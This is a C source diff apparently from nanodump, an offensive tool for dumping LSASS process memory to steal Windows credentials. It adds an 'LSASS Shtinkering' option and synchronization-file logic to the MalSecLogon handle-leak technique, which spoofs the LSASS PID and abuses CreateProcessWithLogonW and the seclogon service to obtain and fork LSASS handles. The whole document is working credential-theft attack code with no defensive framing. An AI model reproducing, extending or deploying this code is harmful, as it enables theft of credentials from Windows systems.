@@ -28,7 +28,9 @@ VOID set_command_line(
     IN LPCSTR dump_path,
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
-    IN BOOL use_valid_sig)
+    IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering,
+    IN LPWSTR synchronization_file)
 {
     // program path
     wchar_t program_name_w[MAX_PATH];
@@ -39,10 +41,13 @@ VOID set_command_line(
     if (!use_malseclogon_locally)
         return;
     // dump path
-    wchar_t dump_path_w[MAX_PATH];
-    mbstowcs(dump_path_w, dump_path, MAX_PATH);
-    wcsncat(command_line, L" -w ", MAX_PATH);
-    wcsncat(command_line, dump_path_w, MAX_PATH);
+    if (dump_path)
+    {
+        wchar_t dump_path_w[MAX_PATH];
+        mbstowcs(dump_path_w, dump_path, MAX_PATH);
+        wcsncat(command_line, L" -w ", MAX_PATH);
+        wcsncat(command_line, dump_path_w, MAX_PATH);
+    }
     // --fork
     if (fork_lsass)
         wcsncat(command_line, L" -f", MAX_PATH);
@@ -52,6 +57,13 @@ VOID set_command_line(
     // --valid
     if (use_valid_sig)
         wcsncat(command_line, L" -v", MAX_PATH);
+    if (use_lsass_shtinkering)
+        wcsncat(command_line, L" -sk", MAX_PATH);
+    if (synchronization_file)
+    {
+        wcsncat(command_line, L" -sync ", MAX_PATH);
+        wcsncat(command_line, synchronization_file, MAX_PATH);
+    }
     // malseclogon
     wcsncat(command_line, L" -sll", MAX_PATH);
     // --stage 2
@@ -77,22 +89,29 @@ BOOL save_new_process_pid(
 // wait until the process exits and check if the dumpfile exists
 BOOL check_if_succeded(
     IN DWORD new_pid,
-    IN LPCSTR dump_path)
+    IN LPWSTR synchronization_file)
 {
+    CHAR full_path[MAX_PATH] = { 0 };
+    wcstombs(full_path, synchronization_file, MAX_PATH);
+
     // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
     HANDLE hSpoofedProcess = get_process_handle(
         new_pid,
         SYNCHRONIZE,
-        FALSE);
+        FALSE,
+        0);
     if (!hSpoofedProcess)
         return FALSE;
 
     BOOL success = wait_for_process(hSpoofedProcess);
+    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
     if (!success)
         return FALSE;
 
-    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
-    if (!file_exists(dump_path))
+    if (!file_exists(full_path))
+        return FALSE;
+
+    if (!delete_file(full_path))
         return FALSE;
 
     return TRUE;
@@ -127,6 +146,7 @@ BOOL malseclogon_handle_leak(
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
     IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering,
     IN BOOL use_malseclogon_locally,
     IN DWORD lsass_pid,
     OUT PPROCESS_LIST* Pcreated_processes)
@@ -155,6 +175,7 @@ BOOL malseclogon_handle_leak(
         fork_lsass,
         snapshot_lsass,
         use_valid_sig,
+        use_lsass_shtinkering,
         use_malseclogon_locally,
         lsass_pid,
         created_processes);
@@ -163,20 +184,60 @@ BOOL malseclogon_handle_leak(
         PRINT_ERR("the --malseclogon-leak-local technique failed!");
         if (created_processes)
         {
+            kill_created_processes(created_processes);
             intFree(created_processes); created_processes = NULL;
             *Pcreated_processes = NULL;
         }
         return FALSE;
     }
-    if (use_malseclogon_locally)
-    {
-        // MalSecLogon created a new nanodump process which created the dump
-        print_success(
-            dump_path,
-            use_valid_sig,
-            TRUE);
-    }
+
     return TRUE;
+}
+
+VOID generate_rand_string(
+    OUT LPWSTR str,
+    IN DWORD size)
+{
+    time_t t;
+    DWORD key = 0;
+    DWORD start = 0;
+    DWORD len_name = 15;
+    DWORD i = 0;
+
+    srand((unsigned) time(&t));
+
+    for (start = 0; str[start] && start < size - 1; start++){}
+    str[start++] = '\\';
+
+    CHAR charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for (i = 0; i < len_name; i++)
+    {
+        key = rand() % (sizeof charset - 1);
+        str[start + i] = charset[key];
+    }
+    str[start + i] = '\x00';
+}
+
+BOOL generate_synchronization_file(
+    OUT LPWSTR synchronization_file,
+    IN DWORD size)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+
+    success = get_env_var(
+        L"Temp",
+        synchronization_file,
+        size);
+    if (!success)
+        goto cleanup;
+
+    generate_rand_string(synchronization_file, size);
+
+    ret_val = TRUE;
+
+cleanup:
+    return ret_val;
 }
 
 BOOL malseclogon_stage_1(
@@ -185,23 +246,41 @@ BOOL malseclogon_stage_1(
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
     IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering,
     IN BOOL use_malseclogon_locally,
     IN DWORD lsass_pid,
     OUT PPROCESS_LIST process_list)
 {
+    BOOL ret_val = FALSE;
     BOOL success = FALSE;
     PHANDLE_LIST handle_list = NULL;
+    LPWSTR synchronization_file = NULL;
+    wchar_t command_line[MAX_PATH] = { 0 };
+    DWORD original_pid = 0;
+    PROCESS_INFORMATION procInfo = { 0 };
+    STARTUPINFOW startInfo = { 0 };
+    wchar_t filename[MAX_PATH] = { 0 };
+    CreateProcessWithLogonW_t CreateProcessWithLogonW = NULL;
+    DWORD handles_leaked = 0;
+    BOOL synchronization_file_found = FALSE;
 
-    // if the file already exists, delete it
-    if (file_exists(dump_path))
+    if (use_lsass_shtinkering || use_malseclogon_locally)
     {
-        if (!delete_file(dump_path))
+        synchronization_file = intAlloc(MAX_PATH);
+        if (!synchronization_file)
         {
-            return FALSE;
+            malloc_failed();
+            goto cleanup;
         }
+        success = generate_synchronization_file(
+            synchronization_file,
+            MAX_PATH);
+        if (!success)
+            goto cleanup;
+
+        DPRINT("synchronization_file: %ls", synchronization_file);
     }
 
-    wchar_t command_line[MAX_PATH];
     set_command_line(
         use_malseclogon_locally,
         command_line,
@@ -209,37 +288,32 @@ BOOL malseclogon_stage_1(
         dump_path,
         fork_lsass,
         snapshot_lsass,
-        use_valid_sig);
+        use_valid_sig,
+        use_lsass_shtinkering,
+        synchronization_file);
+
+    DPRINT("command line: %ls", command_line);
 
     handle_list = find_process_handles_in_process(
         lsass_pid,
         LSASS_DEFAULT_PERMISSIONS);
     if (!handle_list)
-    {
-        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
-        return FALSE;
-    }
+        goto cleanup;
 
     if (handle_list->Count == 0)
     {
         PRINT_ERR(
             "No handles found in " LSASS ", is the PID %ld correct?.",
             lsass_pid);
-        intFree(handle_list); handle_list = NULL;
-        return FALSE;
+        goto cleanup;
     }
 
     // change our PID to the LSASS PID
-    DWORD original_pid;
     change_pid(lsass_pid, &original_pid);
 
-    PROCESS_INFORMATION procInfo;
-    STARTUPINFOW startInfo;
-    wchar_t filename[MAX_PATH];
     mbstowcs(filename, program_name, MAX_PATH);
 
     // find the address of CreateProcessWithLogonW dynamically
-    CreateProcessWithLogonW_t CreateProcessWithLogonW;
     CreateProcessWithLogonW = (CreateProcessWithLogonW_t)(ULONG_PTR)get_function_address(
         get_library_address(ADVAPI32_DLL, TRUE),
         CreateProcessWithLogonW_SW2_HASH,
@@ -247,11 +321,9 @@ BOOL malseclogon_stage_1(
     if (!CreateProcessWithLogonW)
     {
         api_not_found("CreateProcessWithLogonW");
-        intFree(handle_list); handle_list = NULL;
-        return FALSE;
+        goto cleanup;
     }
 
-    DWORD handles_leaked = 0;
     while (handles_leaked < handle_list->Count)
     {
         memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
@@ -281,13 +353,10 @@ BOOL malseclogon_stage_1(
         if (!success)
         {
             function_failed("CreateProcessWithLogonW");
-            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
-            change_pid(original_pid, NULL);
-            intFree(handle_list); handle_list = NULL;
-            return FALSE;
+            goto cleanup;
         }
         DPRINT(
-            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from lsass: 0x%lx 0x%lx 0x%lx",
+            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from " LSASS ": 0x%lx 0x%lx 0x%lx",
             filename,
             procInfo.dwProcessId,
             (DWORD)(ULONG_PTR)startInfo.hStdInput,
@@ -297,49 +366,55 @@ BOOL malseclogon_stage_1(
         // save the PID of the newly created process
         success = save_new_process_pid(process_list, procInfo.dwProcessId);
         if (!success)
-        {
-            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
-            change_pid(original_pid, NULL);
-            intFree(handle_list); handle_list = NULL;
-            return FALSE;
-        }
+            goto cleanup;
 
-        // if MalSecLogon was used against nanodump, check if the minidump was created
-        if (use_malseclogon_locally)
+        if (synchronization_file)
         {
             success = check_if_succeded(
                 procInfo.dwProcessId,
-                dump_path);
+                synchronization_file);
             if (success)
             {
-                DPRINT(
-                    "The dump was succesfully created at %s",
-                    dump_path);
-                change_pid(original_pid, NULL);
-                intFree(handle_list); handle_list = NULL;
-                return TRUE;
+                synchronization_file_found = TRUE;
+                break;
             }
         }
     }
 
-    // restore the original PID
-    change_pid(original_pid, NULL);
-    intFree(handle_list); handle_list = NULL;
-    if (use_malseclogon_locally)
+    if ((use_malseclogon_locally || use_lsass_shtinkering) &&
+        !synchronization_file_found)
     {
-        // the new nanodump process was unable to create the minidump
         DPRINT_ERR("The created nanodump process did not create the dump");
-        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
-        return FALSE;
+        goto cleanup;
+    }
+
+    if (use_lsass_shtinkering)
+    {
+        print_shtinkering_crash_location();
+    }
+    else if (use_malseclogon_locally)
+    {
+        print_success(dump_path, use_valid_sig, TRUE);
     }
     else
     {
-        // all the processes with the leaked handles have been created
+        // use_malseclogon_remotely
         DPRINT(
             "Created %ld processes, trying to duplicate one of the leaked handles to " LSASS,
             process_list->Count);
-        return TRUE;
     }
+
+    ret_val = TRUE;
+
+cleanup:
+    if (synchronization_file)
+        intFree(synchronization_file);
+    if (handle_list)
+        intFree(handle_list);
+    if (original_pid)
+        change_pid(original_pid, NULL);
+
+    return ret_val;
 }
 
 VOID malseclogon_trigger_lock(
@@ -755,7 +830,8 @@ DWORD get_seclogon_pid(VOID)
 }
 
 HANDLE malseclogon_race_condition(
-    IN DWORD lsass_pid)
+    IN DWORD lsass_pid,
+    IN DWORD attributes)
 {
     BOOL success = FALSE;
     HANDLE hSeclogon = NULL;
@@ -807,7 +883,8 @@ HANDLE malseclogon_race_condition(
     hSeclogon = get_process_handle(
         seclogon_pid,
         PROCESS_DUP_HANDLE,
-        TRUE);
+        TRUE,
+        0);
     if (!hSeclogon)
     {
         PRINT_ERR("Could not open handle to seclogon");
@@ -837,7 +914,7 @@ HANDLE malseclogon_race_condition(
         // if not lsass, continue
         if (!is_lsass(hDupedHandle))
         {
-            DPRINT("The handle was not from" LSASS);
+            DPRINT("The handle was not from " LSASS);
             NtClose(hDupedHandle); hDupedHandle = NULL;
             continue;
         }
@@ -850,7 +927,8 @@ HANDLE malseclogon_race_condition(
          * we duplicated has PROCESS_CREATE_PROCESS
          */
         hProcess = fork_process(
-            hDupedHandle);
+            hDupedHandle,
+            attributes);
         if (hProcess)
         {
             // the handle is closed by fork_process
@@ -879,10 +957,6 @@ end:
 HANDLE malseclogon_stage_2(
     IN LPCSTR dump_path)
 {
-    // if the file already exists, exit
-    if (file_exists(dump_path))
-        return NULL;
-
     BOOL found_handle = FALSE;
     HANDLE hProcess = NULL;
     for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
